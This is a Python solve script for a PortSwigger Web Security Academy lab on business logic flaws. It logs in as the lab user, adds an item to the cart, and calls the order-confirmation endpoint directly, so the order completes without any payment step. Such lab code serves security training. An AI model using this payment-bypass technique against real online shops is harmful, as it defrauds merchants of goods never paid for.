#!/usr/bin/env python3
"""
Insufficient workflow validation
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 08-insufficient-workflow-validation.md

What this does:
    Logs in as wiener:peter, adds the leather jacket to the cart, then skips
    the payment step entirely and requests
    GET /cart/order-confirmation?order-confirmation=true directly -- without
    ever sending a successful (or any) POST /cart/checkout. The confirmation
    endpoint doesn't verify that a matching payment actually went through,
    only that the query parameter is present, so it marks the order
    complete anyway.

Usage:
    python 08-insufficient-workflow-validation.py <lab-url>
    e.g. python 08-insufficient-workflow-validation.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)
    _login(c, lab_url, "wiener", "peter")

    csrf = _get_csrf(c, f"{lab_url}/cart")
    c.post(f"{lab_url}/cart", data={
        "csrf": csrf, "productId": "1",
        "quantity": "1", "redir": "PRODUCT"
    })
    print("[*] Added jacket to cart -- never sending a checkout POST")

    r = c.get(f"{lab_url}/cart/order-confirmation?order-confirmation=true")
    print(f"[*] Requested order-confirmation directly, status={r.status_code}")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- confirmation page accepted an order that was never paid for.")
    else:
        print("[-] Not solved yet -- inspect the order-confirmation response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
